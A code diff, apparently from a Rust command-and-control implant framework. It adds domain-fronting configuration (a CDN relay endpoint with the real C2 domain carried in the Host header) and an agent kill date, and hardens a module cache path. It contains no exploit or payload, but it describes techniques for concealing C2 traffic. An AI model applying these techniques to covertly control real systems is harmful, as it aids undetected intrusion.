@@ -87,6 +87,16 @@ pub struct MalleableProfile {
     /// `"https://c2.example.com/doh-bridge"`.
     #[serde(default)]
     pub doh_server_url: Option<String>,
+    /// CDN relay endpoint for domain fronting.  The TCP connection goes here;
+    /// the Host header carries the actual C2 domain.  Required when
+    /// `cdn_relay = true`; the agent will bail at startup if this is empty
+    /// and cdn_relay is enabled.  Example: `"cdn-provider.example.com"`.
+    #[serde(default)]
+    pub cdn_endpoint: String,
+    /// Optional kill date in `YYYY-MM-DD` format (UTC).  When set, the agent
+    /// will refuse to connect after this date.  Leave empty to disable.
+    #[serde(default)]
+    pub kill_date: String,
 }
 
 fn default_user_agent() -> String {
@@ -113,6 +123,8 @@ impl Default for MalleableProfile {
             direct_c2_endpoint: String::new(),
             doh_beacon_sentinel: default_doh_beacon_sentinel(),
             doh_server_url: None,
+            cdn_endpoint: String::new(),
+            kill_date: String::new(),
         }
     }
 }
@@ -304,12 +316,17 @@ pub fn default_module_cache_dir() -> String {
             .to_string_lossy()
             .into_owned()
     } else {
-        let home = std::env::var_os("HOME")
+        // Prefer $XDG_CACHE_HOME; fall back to $HOME/.cache.
+        // Never fall back to /tmp which is world-writable (M-38 fix).
+        let cache_base = std::env::var_os("XDG_CACHE_HOME")
             .map(PathBuf::from)
-            .unwrap_or_else(|| PathBuf::from("/tmp"));
-        home.join(".cache")
-            .join("orchestra")
-            .join("modules")
+            .or_else(|| {
+                std::env::var_os("HOME")
+                    .map(|h| PathBuf::from(h).join(".cache"))
+            });
+        cache_base
+            .map(|p| p.join("orchestra").join("modules"))
+            .unwrap_or_default()
             .to_string_lossy()
             .into_owned()
     }
